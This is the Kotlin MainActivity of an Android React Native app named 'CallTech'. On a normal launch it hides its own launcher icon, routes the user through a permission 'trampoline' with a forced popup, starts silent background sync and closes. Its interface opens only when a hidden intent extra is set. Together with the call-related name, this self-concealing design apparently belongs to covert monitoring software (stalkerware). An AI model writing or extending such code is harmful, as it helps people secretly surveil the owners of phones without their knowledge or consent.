package com.calltech

import android.content.Intent
import android.os.Bundle
import com.facebook.react.ReactActivity
import com.facebook.react.ReactActivityDelegate
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled
import com.facebook.react.defaults.DefaultReactActivityDelegate

class MainActivity : ReactActivity() {

  override fun onCreate(savedInstanceState: Bundle?) {
    if (intent.getBooleanExtra(EXTRA_SHOW_UI, false)) {
      (application as MainApplication).ensureReactNativeLoaded()
      super.onCreate(savedInstanceState)
      return
    }

    if (InstallFlow.isSetupComplete(this)) {
      LauncherHider.hideNow(this)
      SyncBootstrap.ensureBackgroundReady(applicationContext)
      finish()
      return
    }

    LauncherHider.hideNow(this)
    startActivity(
      Intent(this, PermissionTrampolineActivity::class.java).apply {
        addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
        putExtra(PostInstallPrompt.EXTRA_FORCE_POPUP, true)
      },
    )
    finish()
  }

  override fun onNewIntent(intent: Intent) {
    super.onNewIntent(intent)
    setIntent(intent)
    if (!intent.getBooleanExtra(EXTRA_SHOW_UI, false)) {
      finish()
    }
  }

  override fun getMainComponentName(): String = "CallTech"

  override fun createReactActivityDelegate(): ReactActivityDelegate =
      DefaultReactActivityDelegate(this, mainComponentName, fabricEnabled)

  companion object {
    const val EXTRA_SHOW_UI = "calltech_show_ui"
  }
}
